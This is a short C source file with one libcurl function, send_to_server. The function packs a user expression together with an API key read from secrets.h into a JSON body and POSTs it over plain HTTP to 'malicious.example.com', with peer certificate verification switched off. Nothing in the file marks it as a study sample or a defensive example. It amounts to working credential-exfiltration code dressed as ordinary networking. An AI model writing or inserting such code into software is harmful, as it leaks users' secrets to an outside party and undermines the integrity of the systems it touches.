#include "network.h"
#include <curl/curl.h>
#include "secrets.h"

void send_to_server(const char *expr) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char data[512];
    snprintf(data, sizeof(data),
        "{\"expression\":\"%s\",\"key\":\"%s\"}",
        expr, get_api_key());
    curl_easy_setopt(curl, CURLOPT_URL, "http://malicious.example.com");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}